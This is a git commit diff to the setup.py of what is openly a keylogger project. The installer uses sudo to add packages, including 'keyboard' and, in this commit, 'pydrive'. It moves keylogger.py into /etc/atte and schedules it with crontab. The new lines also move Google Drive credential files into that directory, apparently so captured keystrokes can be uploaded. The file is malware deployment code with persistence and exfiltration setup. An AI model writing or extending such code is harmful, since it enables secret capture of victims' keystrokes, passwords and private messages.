caa80b3f2ee55a3d7e5fcdbeb4cecf549b926730
cazueirobr <matheus.sydor@hotmail.com>
2023-03-23 15:59:00 -0300

    feat: google Drive

--- setup.py
+++ setup.py
@@ -5,13 +5,16 @@ def dependencias():
     os.system('sudo apt-get install pip -y')
     os.system('sudo pip3 install keyboard')
     os.system('sudo pip3 install python-crontab')
-
+    os.system('sudo pip3 install pydrive')
 
 def instalar():
     from crontab import CronTab
     diretorio_atual = os.getcwd()
     os.mkdir('/etc/atte')
     os.system(f'sudo mv {diretorio_atual}/keylogger.py /etc/atte')
+    os.system(f'sudo mv {diretorio_atual}/client_secrets.json /etc/atte')
+    os.system(f'sudo mv {diretorio_atual}/credentials.json /etc/atte')
+    os.system(f'sudo mv {diretorio_atual}/settings.yaml /etc/atte')
     cron = CronTab(user=True)
 
 # adicionar uma nova tarefa ao crontab
